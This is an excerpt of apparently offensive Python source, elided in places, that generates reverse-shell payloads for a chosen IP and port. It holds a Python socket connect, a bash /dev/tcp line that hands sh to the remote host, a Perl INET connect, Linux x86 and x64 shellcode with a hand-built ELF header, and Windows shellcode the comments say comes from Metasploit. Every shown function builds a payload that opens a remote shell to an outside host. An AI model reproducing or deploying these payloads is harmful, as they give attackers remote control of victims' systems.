...
def pyreverse_tcp( IP=None, PORT=None):
    ...
    padd = 's.connect(("%s",%s))' % (str(IP),str(PORT))
    ret = [
...
def shreverse_tcp( IP=None, PORT=None):
    ...
    rand = randint(0, 99)
    ret = "0<&%d-;exec %d<>/dev/tcp/%s/%s;sh <&%d >&%d 2>&%d" % (rand,rand,IP,PORT,rand,rand,rand)
    return ret
...
def plreverse_tcp( IP=None, PORT=None):
    ...
    padd = 'INET(PeerAddr,"%s:%s");' % (IP,PORT)
    ret += padd
...
def linx86reverse_tcp( IP=None, PORT=None):
    ...
    byteman  =  "7f454c4601010100000000000000000002000300010000005480040"
    byteman  += "834000000000000000000000034002000010000000000000001000"
    byteman  += "0000000000000800408008004089c000000001000000700000000100000"
    byteman = byteman+shellcode.replace(r"\x", "")
    return byteman


#BETA, need test.
def winreverse_tcp( IP=None, PORT=None):
    huuha  = "" 

    #That payload get from metasploit.com
    byteman =  r"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50" 
    byteman += r"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" 
...
def linx64reverse_tcp( IP=None, PORT=None):
    shellcode = ""
    padd =  r"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    padd += r"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
